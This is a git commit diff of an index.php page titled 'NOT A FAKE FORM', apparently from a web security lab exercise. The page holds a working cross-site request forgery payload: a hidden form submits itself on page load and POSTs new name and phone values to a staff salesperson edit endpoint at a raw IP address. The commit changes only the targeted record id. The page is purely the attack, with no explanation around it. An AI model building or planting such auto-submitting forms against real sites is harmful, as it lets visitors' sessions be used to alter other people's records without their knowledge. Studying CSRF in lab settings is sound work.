30912b3f0834dab563857d172ea27287f9bdadcf
Elaheh Jamali <42677561+Jamaliela@users.noreply.github.com>
2019-03-31 22:50:03 -0400

    Update index.php

--- index.php
+++ index.php
@@ -3,7 +3,7 @@
     <title>NOT A FAKE FORM</title>
   </head>
   <body onload="document.my_form.submit()">
-    <form action="https://35.184.199.7/red/public/staff/salespeople/edit.php?id=22" method="POST" name="my_form" style="display: none;" target="hidden_results" >
+    <form action="https://35.184.199.7/red/public/staff/salespeople/edit.php?id=5" method="POST" name="my_form" style="display: none;" target="hidden_results" >
       <input type="text" name="first_name" value="Elaheh" />
       <input type="text" name="last_name" value="Jamali" />
       <input type="text" name="phone" value="989-098-7564" />
